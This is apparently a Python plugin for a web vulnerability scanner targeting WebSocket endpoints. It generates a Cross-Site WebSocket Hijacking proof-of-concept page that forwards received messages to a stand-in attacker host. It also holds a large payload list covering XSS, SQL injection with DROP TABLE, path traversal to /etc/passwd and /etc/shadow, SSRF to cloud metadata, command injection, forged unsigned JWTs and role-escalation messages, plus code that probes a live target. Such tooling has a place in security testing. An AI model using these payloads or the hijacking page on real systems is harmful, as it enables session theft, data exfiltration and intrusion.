"""
WebSocket Exploit Plugin

Provides exploit capabilities for WebSocket security issues:
- Cross-Site WebSocket Hijacking (CSWSH) PoC generation
- Missing authentication checks
- Message injection
"""

import sys
import os
from typing import Dict, List, Any, Optional
import logging

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from scanner.plugins.exploit_plugin import ExploitPlugin
from scanner.plugins.payload_mutator import PayloadMutator

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

logger = logging.getLogger(__name__)


def _cswsh_poc(ws_url: str) -> str:
    """Generate a Cross-Site WebSocket Hijacking PoC HTML page."""
    return f'''<!DOCTYPE html>
<html>
<head><title>CSWSH PoC</title></head>
<body>
<h2>Cross-Site WebSocket Hijacking PoC</h2>
<p id="output">Connecting...</p>
<script>
var ws = new WebSocket("{ws_url}");
ws.onopen = function() {{
  document.getElementById("output").innerText = "Connected!";
  ws.send(JSON.stringify({{type: "ping"}}));
}};
ws.onmessage = function(e) {{
  document.getElementById("output").innerText = "Data received: " + e.data;
  fetch("https://attacker.example.com/steal?data=" + encodeURIComponent(e.data));
}};
ws.onerror = function(e) {{
  document.getElementById("output").innerText = "Error: " + e;
}};
</script>
</body>
</html>'''


class WebSocketPlugin(ExploitPlugin):
    """WebSocket exploit plugin."""

    @property
    def vulnerability_type(self) -> str:
        return 'websocket'

    @property
    def name(self) -> str:
        return 'WebSocket Exploit'

    @property
    def description(self) -> str:
        return 'WebSocket exploit: CSWSH PoC, missing auth detection, message injection.'

    @property
    def version(self) -> str:
        return '1.0.0'

    def generate_payloads(self, context: Optional[Dict[str, Any]] = None) -> List[str]:
        """Return WebSocket attack payloads."""
        context = context or {}
        ws_url = context.get('ws_url', 'ws://target.example.com/ws')
        payloads = [
            _cswsh_poc(ws_url),
            '{"type":"ping"}',
            '{"type":"subscribe","channel":"*"}',
            '{"cmd":"ls"}',
            '<script>alert(1)</script>',
            '{"type":"message","data":"<img src=x onerror=alert(1)>"}',
            '{"action":"admin","role":"administrator"}',
            '{"type":"auth","token":""}',
            '{"type":"auth","token":"null"}',
            '{"userId":1,"action":"getAll"}',
            '{"userId":"1 OR 1=1","action":"get"}',
            '{"type":"login","username":"admin","password":""}',
            '{"auth":null}',
            '{"session":"../../../etc/passwd"}',
            '{"url":"http://169.254.169.254/latest/meta-data/"}',
            '{"endpoint":"http://localhost:8080/admin"}',
            '{"type":"subscribe","channel":"' + 'A' * 100 + '"}',
            '{"query":"' + '{' * 20 + '__typename' + '}' * 20 + '"}',
            '{"type":"handshake","origin":"null"}',
            '{"type":"upgrade","protocol":"ws"}',
            '{"type":"broadcast","data":"test","target":"*"}',
            # Extra WebSocket attack payloads
            '{"type":"ping","data":"' + 'A' * 200 + '"}',
            '{"action":"getUsers","filter":"admin"}',
            '{"action":"deleteUser","id":1}',
            '{"action":"changeRole","userId":1,"role":"admin"}',
            '{"type":"auth","token":"null","userId":1}',
            '{"type":"auth","token":"undefined"}',
            '{"type":"auth","bypass":true}',
            '{"userId":"1 OR 1=1","action":"getProfile"}',
            '{"userId":"1; DROP TABLE users--"}',
            '{"query":"{ __schema { types { name } } }"}',
            '{"query":"mutation { deleteUser(id:1){success} }"}',
            '{"url":"file:///etc/passwd"}',
            '{"url":"http://localhost:8080/admin"}',
            '{"url":"http://127.0.0.1/internal"}',
            '{"url":"gopher://localhost:3306/"}',
            '{"session":"../../etc/passwd"}',
            '{"session":"../../../etc/shadow"}',
            '{"data":"<script>alert(1)</script>"}',
            '{"data":"\\"><img src=x onerror=alert(1)>"}',
            '{"message":"{{7*7}}"}',
            '{"message":"${7*7}"}',
            '{"cmd":"id","shell":"bash"}',
            '{"exec":"whoami"}',
            '{"command":"ls -la"}',
            '{"eval":"process.env"}',
            '{"type":"subscribe","topic":"admin"}',
            '{"type":"subscribe","topic":"system"}',
            '{"type":"subscribe","topic":"*"}',
            '{"type":"unsubscribe","topic":"*"}',
            '{"type":"publish","topic":"admin","data":"evil"}',
            '{"token":"eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ."}',
            '{"role":"admin","id":1}',
            '{"isAdmin":true,"userId":1}',
            '{"permissions":["admin","superuser"],"userId":1}',
            '{"type":"message","to":"admin","content":"<script>alert(1)</script>"}',
            '{"type":"auth","token":"eyJhbGciOiJub25lIn0.eyJzdWIiOiIxIn0."}',
            '{"type":"auth","token":"eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.invalid"}',
            '{"userId":"admin","action":"getAll"}',
            '{"userId":"root","action":"getAll"}',
            '{"userId":"../etc/passwd","action":"get"}',
            '{"channel":"admin","subscribe":true}',
            '{"channel":"system","subscribe":true}',
            '{"event":"admin.created","data":{}}',
            '{"event":"user.deleted","id":1}',
            '{"broadcast":"all","message":"<script>alert(1)</script>"}',
            '{"type":"error","stack":"' + 'x' * 500 + '"}',
        ]
        # Generate dynamic WebSocket attack payloads
        dynamic_ws = []
        for i in range(1, 50):
            dynamic_ws.append(f'{{"userId":{i},"action":"getProfile"}}')
            dynamic_ws.append(f'{{"id":{i},"type":"getData"}}')
            dynamic_ws.append(f'{{"targetId":{i},"action":"delete"}}')
        for cmd in ['id', 'whoami', 'ls', 'pwd', 'cat /etc/passwd']:
            dynamic_ws.append(f'{{"cmd":"{cmd}"}}')
            dynamic_ws.append(f'{{"exec":"{cmd}"}}')
            dynamic_ws.append(f'{{"command":"{cmd}"}}')
        for url in ['http://169.254.169.254/', 'http://localhost:8080/', 'file:///etc/passwd',
                    'http://127.0.0.1:22/', 'http://127.0.0.1:3306/',
                    'gopher://localhost:6379/', 'dict://localhost:11211/']:
            dynamic_ws.append(f'{{"url":"{url}"}}')
            dynamic_ws.append(f'{{"endpoint":"{url}"}}')
            dynamic_ws.append(f'{{"target":"{url}"}}')
        for payload in ['<script>alert(1)</script>', '"><img src=x onerror=alert(1)>',
                        "'; alert(1)//", '{{7*7}}', '${7*7}', '#{7*7}']:
            dynamic_ws.append(f'{{"data":"{payload}"}}')
            dynamic_ws.append(f'{{"message":"{payload}"}}')
            dynamic_ws.append(f'{{"content":"{payload}"}}')
        payloads.extend(dynamic_ws)
        return PayloadMutator.scale_payloads_to_minimum(payloads)

    def execute_attack(self, target_url: str, vulnerability_data: Dict[str, Any],
                       config: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        """
        Check WebSocket upgrade endpoint for missing auth. Falls back to HTTP check
        when websocket-client is not available.
        """
        config = config or {}
        verify_ssl = config.get('verify_ssl', False)
        timeout = config.get('timeout', 10)

        ws_url = vulnerability_data.get('ws_url', '')
        if not ws_url:
            # Derive ws_url from target_url
            ws_url = target_url.replace('https://', 'wss://').replace('http://', 'ws://')

        # Generate CSWSH PoC HTML regardless
        poc_html = _cswsh_poc(ws_url)

        # Try websocket-client if available
        try:
            import websocket  # type: ignore

            def _on_open(ws):
                ws.send('{"type":"ping"}')

            messages = []

            def _on_message(ws, message):
                messages.append(message)
                ws.close()

            ws = websocket.WebSocketApp(
                ws_url,
                on_open=_on_open,
                on_message=_on_message,
            )
            ws.run_forever(sslopt={'check_hostname': False} if not verify_ssl else {})

            if messages:
                return {
                    'success': True,
                    'vulnerability_type': 'websocket',
                    'attack': 'unauthenticated_connection',
                    'evidence': f'Connected to WebSocket without authentication; received: {messages[0][:200]}',
                    'poc_html': poc_html,
                    'message': 'WebSocket accepts unauthenticated connections',
                }
        except ImportError:
            logger.debug("websocket-client not available; using HTTP fallback")
        except Exception as e:
            logger.debug(f"WebSocket connect error: {e}")

        # HTTP fallback: send upgrade request without Origin
        if HAS_REQUESTS:
            try:
                headers = {
                    'Upgrade': 'websocket',
                    'Connection': 'Upgrade',
                    'Sec-WebSocket-Key': 'dGhlIHNhbXBsZSBub25jZQ==',
                    'Sec-WebSocket-Version': '13',
                }
                resp = requests.get(target_url, headers=headers, timeout=timeout,
                                    verify=verify_ssl, allow_redirects=False)
                if resp.status_code == 101:
                    return {
                        'success': True,
                        'vulnerability_type': 'websocket',
                        'attack': 'upgrade_without_origin',
                        'evidence': 'WebSocket upgrade accepted without Origin header validation',
                        'poc_html': poc_html,
                        'message': 'WebSocket missing Origin validation',
                    }
            except Exception as e:
                logger.debug(f"WebSocket HTTP fallback error: {e}")

        # Return PoC anyway as informational
        return {
            'success': False,
            'error': 'Could not confirm WebSocket vulnerability automatically',
            'vulnerability_type': 'websocket',
            'poc_html': poc_html,
        }
